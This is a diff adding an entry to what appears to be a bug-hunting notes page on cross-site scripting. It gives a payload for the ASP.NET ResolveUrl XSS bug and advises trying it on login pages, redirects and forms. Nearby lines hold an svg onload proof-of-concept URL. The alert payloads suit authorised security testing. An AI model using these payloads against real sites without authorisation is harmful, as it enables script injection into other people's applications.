@@ -796,6 +796,11 @@ upload a picture file, intercept it, change picturename.jpg to xss payload
   * POC: `https://www.redacted.com/etc/designs/redacted.json//%3Csvg%20onload=alert(document.domain)%3E.html`
 * **XSS in meta tag**
   * [XSS bypass using META tag in realestate.postnl.nl | by Prial Islam Khan | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308)
+  *   A decade-old \`ResolveUrl XSS\` bug is still present in many [http://ASP.NET](https://t.co/fJYUdsk50c) apps. I randomly found this bug in a very famous app.  \
+      Try in login pages, redirects, forms & dynamic URL construction (`~/images/`). Payload: `/(A(%22onerror='alert%60123%60'test))/`\
+      Credits:  [https://x.com/nav1n0x/status/1799384973407031565](https://x.com/nav1n0x/status/1799384973407031565)
+
+      <figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
 
 ### [Mind Map](https://xmind.ai/share/CTAMcPfH?xid=O720Am6q)
 
